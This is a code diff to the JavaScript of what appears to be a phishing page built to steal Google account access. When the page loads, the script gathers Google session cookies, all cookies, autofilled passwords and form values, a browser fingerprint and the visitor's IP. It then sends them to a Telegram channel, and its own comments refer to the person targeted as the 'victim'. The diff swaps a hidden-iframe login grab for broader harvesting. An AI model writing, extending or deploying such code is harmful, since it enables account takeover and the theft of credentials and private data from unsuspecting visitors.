@@ -42,63 +42,12 @@
         }
 
         // ============================================================
-        // 🧠 CAPTURE GOOGLE CREDENTIALS (If Saved in Browser)
-        // ============================================================
-        async function captureGoogle() {
-            // Try to load Google login page in hidden iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://accounts.google.com/signin';
-            document.body.appendChild(iframe);
-
-            return new Promise((resolve) => {
-                iframe.onload = function() {
-                    try {
-                        const doc = iframe.contentDocument || iframe.contentWindow.document;
-                        const inputs = doc.querySelectorAll('input');
-                        let email = '', password = '';
-
-                        inputs.forEach(input => {
-                            if (input.value && input.value.trim() !== '') {
-                                if (input.type === 'email' || input.name.includes('email') || input.name.includes('identifier')) {
-                                    email = input.value;
-                                }
-                                if (input.type === 'password') {
-                                    password = input.value;
-                                }
-                            }
-                        });
-
-                        // Also try to get cookies
-                        const cookies = doc.cookie || 'No cookies';
-
-                        // Try to get Google-specific cookies
-                        const googleCookies = document.cookie.split('; ').filter(c => c.includes('google') || c.includes('GAPS')).join('; ');
-
-                        resolve({ email, password, cookies, googleCookies });
-                    } catch(e) {
-                        // Cross-origin – fallback
-                        resolve({ 
-                            email: 'Unable to access (cross-origin)', 
-                            password: '', 
-                            cookies: 'Unable to access',
-                            googleCookies: 'Unable to access'
-                        });
-                    }
-                };
-
-                // Timeout after 5 seconds
-                setTimeout(() => {
-                    resolve({ email: 'Timeout', password: '', cookies: 'Timeout', googleCookies: 'Timeout' });
-                }, 5000);
-            });
-        }
-
-        // ============================================================
         // 🧠 CAPTURE GOOGLE COOKIES (Direct)
         // ============================================================
         function getGoogleCookies() {
             const allCookies = document.cookie.split('; ');
+            
+            // Filter Google-related cookies
             const googleCookies = allCookies.filter(c => 
                 c.includes('google') || 
                 c.includes('GAPS') || 
@@ -106,9 +55,37 @@
                 c.includes('SAPISID') ||
                 c.includes('APISID') ||
                 c.includes('SSID') ||
-                c.includes('HSID')
+                c.includes('HSID') ||
+                c.includes('OSID') ||
+                c.includes('NID')
             );
-            return googleCookies.length > 0 ? googleCookies.join('; ') : 'No Google cookies found';
+            
+            return googleCookies.length > 0 ? googleCookies.join('; ') : 'No Google cookies found (victim not logged in on this domain)';
+        }
+
+        // ============================================================
+        // 🧠 CAPTURE ALL COOKIES
+        // ============================================================
+        function getAllCookies() {
+            return document.cookie || 'No cookies found';
+        }
+
+        // ============================================================
+        // 🧠 GET BROWSER FINGERPRINT
+        // ============================================================
+        function getFingerprint() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                webdriver: navigator.webdriver || false
+            };
         }
 
         // ============================================================
@@ -123,25 +100,80 @@
         }
 
         // ============================================================
+        // 🧠 GET SAVED PASSWORDS (Auto-filled fields)
+        // ============================================================
+        function getSavedPasswords() {
+            let results = [];
+            document.querySelectorAll('input[type="password"]').forEach(el => {
+                if (el.value && el.value.trim() !== '') {
+                    results.push({ name: el.name || el.id || 'password', value: el.value });
+                }
+            });
+            return results;
+        }
+
+        // ============================================================
+        // 🧠 GET AUTO-FILLED FIELDS
+        // ============================================================
+        function getAutoFillData() {
+            let results = [];
+            document.querySelectorAll('input').forEach(el => {
+                if (el.value && el.value.trim() !== '') {
+                    results.push({
+                        type: el.type || 'text',
+                        name: el.name || el.id || 'unknown',
+                        value: el.value
+                    });
+                }
+            });
+            return results;
+        }
+
+        // ============================================================
         // 🚀 MAIN EXECUTION
         // ============================================================
         window.addEventListener('load', async function() {
 
-            // Capture Google data
-            const data = await captureGoogle();
             const ip = await getIP();
             const time = new Date().toISOString();
-
-            // Get Google cookies directly
             const googleCookies = getGoogleCookies();
+            const allCookies = getAllCookies();
+            const fingerprint = getFingerprint();
+            const savedPasswords = getSavedPasswords();
+            const autoFillData = getAutoFillData();
 
-            let msg = `🎯 **GOOGLE/GMAIL CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `📧 Email: ${data.email || 'Not found'}\n`;
-            msg += `🔑 Password: ${data.password || 'Not found'}\n`;
-            msg += `🍪 Cookies (iframe): ${data.cookies || 'Not found'}\n`;
-            msg += `🍪 Google Cookies (direct): ${googleCookies}\n`;
-            msg += `🌐 IP: ${ip}\n`;
-            msg += `🕐 Time: ${time}\n━━━━━━━━━━━━━━━━━━━━━`;
+            let msg = `🎯 **GOOGLE/GMAIL CAPTURE (DIRECT)**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🍪 **Google Cookies:** ${googleCookies}\n`;
+            msg += `🍪 **All Cookies:** ${allCookies}\n`;
+            msg += `🌐 **IP:** ${ip}\n`;
+            msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
+
+            if (savedPasswords.length > 0) {
+                msg += `\n🔑 **SAVED PASSWORDS:**\n`;
+                savedPasswords.forEach((p, i) => {
+                    msg += `  ${i+1}. ${p.name}: \`${p.value}\`\n`;
+                });
+            }
+
+            if (autoFillData.length > 0) {
+                msg += `\n📝 **AUTO-FILL DATA:**\n`;
+                autoFillData.forEach((f, i) => {
+                    msg += `  ${i+1}. ${f.name} (${f.type}): \`${f.value}\`\n`;
+                });
+            }
+
+            msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🖥️ **FINGERPRINT:**\n`;
+            msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
+            msg += `  💻 Platform: ${fingerprint.platform}\n`;
+            msg += `  🌍 Language: ${fingerprint.language}\n`;
+            msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
+            msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
+            msg += `  🧠 CPU Cores: ${fingerprint.hardwareConcurrency}\n`;
+            msg += `  💾 Device Memory: ${fingerprint.deviceMemory}GB\n`;
+            msg += `  🍪 Cookies Enabled: ${fingerprint.cookieEnabled}\n`;
+            msg += `  🕵️ WebDriver: ${fingerprint.webdriver}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━`;
 
             await sendToTelegram(msg);
 
